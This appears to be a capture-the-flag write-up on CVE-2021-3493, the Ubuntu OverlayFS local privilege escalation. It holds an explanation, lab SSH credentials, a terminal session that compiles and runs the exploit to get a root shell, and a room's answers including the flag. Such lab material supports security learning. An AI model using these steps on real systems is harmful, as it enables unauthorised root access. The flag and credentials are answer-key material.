# Task 1 What is OverlayFS?
----

OverlayFS is a Linux kernel module that allows the system to combine several mount points into one, so that you can access all the files from each within one directory structure.

It's often used by live USBs, or some other specialist applications. One use is having a read only root file system, and another partition "overlayed" with that to allow applications to write to a temporary file system.

More resources are included in the final task (Further reading) if you'd like to learn more about OverlayFS and this exploit.

Room Banner by Maksym Kaharlytskyi on Unsplash

----

# Task 2 CVE-2021-3493 - OverlayFS Exploit
----

>>About the vuln

>>Recently, SSD-Disclosure released a proof of concept (and a great explanation) for an Ubuntu kernel exploit (https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/).
>>This vulnerability is particularly serious, as overlayfs is a kernel module that is installed by default on Ubuntu 1804 Server.
>>If the system is vulnerable, you can very easily escalate from any user to root, as long as you can run a binary.
>>If there isn't a C compiler installed on the machine, you can compile the binary statically elsewhere and copy just the binary over.
>>Credentials for SSH
```
Username: overlay
Password: tryhackme123
```
>>If you're using the web-based machine, open it in full screen (by clicking the icon) to copy/paste the exploit code.

```bash
root@ip-10-10-26-117:~# ssh overlay@10.10.27.41
The authenticity of host '10.10.27.41 (10.10.27.41)' can't be established.
ECDSA key fingerprint is SHA256:qQKwP0+jnP7TXFnfg6ugLRtnsl2xrr+xfBRCqa5xx3c.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.27.41' (ECDSA) to the list of known hosts.
overlay@10.10.27.41's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jan  6 22:27:01 2022 from 10.100.2.197
overlay@overlayfs:~$ 
overlay@overlayfs:~$ nano exploit.c
overlay@overlayfs:~$ ls
exploit.c
overlay@overlayfs:~$ gcc -o exploit exploit.c
overlay@overlayfs:~$ ./exploit 
bash-4.4# ls
exploit  exploit.c  ovlcap
bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt 
thm{27aaa5865a52dcd4cb04c0e0a2d39404}

```

----

# Task 3 Further reading 
----

>>Want to know more about OverlayFS?
https://yagrebu.net/unix/rpi-overlay.md - Read only root file system with overlayfs to allow applications to run normally.

https://wiki.archlinux.org/index.php/Overlay_filesystem - The Arch Wiki's page on OverlayFS (I don't use Arch BTW)

>>Want to know more about this specific CVE?
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493 - Mitre's CVE entry for this vulnerability, which includes many further links.

https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/ - This is where we got the PoC code, and it explains the vulnerability very well.

----

# ANSWER THE FOLLOWING :
----

1.I have a very rough overview of what OverlayFS is
>>No answer needed

2.Deploy the machine with the Start Machine button in this task and wait up to 2 minutes for the VM to boot.
>>No answer needed

3.SSH into the machine with the credentials provided in the task text.
>>No answer needed

4.Grab the source code for the exploit from SSD-Disclosure here and save it as exploit.c on the target machine.
>>No answer needed

5.Compile the exploit with gcc. If you're finding this difficult, a command is given in the hints.
>>No answer needed

Run your compiled exploit, and get root!
6.What's the flag in /root/?
>>thm{27aaa5865a52dcd4cb04c0e0a2d39404}

7.Hope you've enjoyed this short room.
>>No answer needed
----